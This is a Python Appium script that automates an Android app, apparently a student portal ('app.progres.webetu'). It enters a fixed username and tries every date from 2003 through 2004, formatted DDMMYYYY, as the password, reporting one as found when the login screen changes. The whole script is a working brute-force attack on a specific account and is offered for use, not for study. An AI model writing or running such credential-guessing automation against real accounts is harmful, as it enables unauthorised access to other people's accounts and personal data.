from appium import webdriver
from datetime import datetime, timedelta
import time
from appium.options.android import UiAutomator2Options
from selenium.webdriver.common.by import By

def generate_dates(start_date, end_date):
    date_list = []
    current_date = start_date
    while current_date <= end_date:
        date_list.append(current_date)
        current_date += timedelta(days=1)
    return date_list

# Generate dates from 1st Jan 2003 to 31st Dec 2003
start_date = datetime(2003, 1, 1)
end_date = datetime(2004, 12, 31)
all_dates = generate_dates(start_date, end_date)

# Set up Appium
desired_caps = dict(
    platformName='Android',
    platformVersion='13',  # e.g., '13'
    deviceName='Samsung Galaxy A71 5G',  # e.g., 'emulator-5554'
    appPackage='app.progres.webetu',  # e.g., 'app.progres.webetu'
    appActivity='.MainActivity',  # e.g., '.MainActivity'
    noReset=True  # Prevents Appium from resetting app state between sessions
)

appium_server_url = 'http://localhost:4723'

try:
    driver = webdriver.Remote(appium_server_url, options=UiAutomator2Options().load_capabilities(desired_caps))
except Exception as e:
    print(f"Failed to create WebDriver: {e}")
    exit(1)

# Locate your username field and set it once
try:
    elements = driver.find_elements(By.CLASS_NAME, 'android.widget.EditText')
    username_field = elements[0]
    username_field.clear()
    username_field.send_keys('202131030537')  # Fill in your username
except Exception as e:
    print(f"Failed to find UI elements: {e}")
    driver.quit()
    exit(1)


previous_password = None

# Loop through the dates and try each one as a password
for date in all_dates:
    password = date.strftime('%d%m%Y')  # Format as DDMMYYYY with leading zeroes
    try:
        # Re-locate the password field and login button
        elements = driver.find_elements(By.CLASS_NAME, 'android.widget.EditText')
        password_field = elements[1]
        buttons = driver.find_elements(By.CLASS_NAME, 'android.widget.TextView')
        login_button = buttons[4]

        password_field.clear()
        password_field.send_keys(password)
        login_button.click()

        print(f"Tried with password {password}")

        previous_password = password
       
    except Exception as e:
        if previous_password:
            print(f"Found Password {previous_password}")
            exit(1)
        else:
            print(f"An error occurred before finding a valid password: {e}")
            exit(1)
        break
        

# Close the Appium driver
driver.quit()
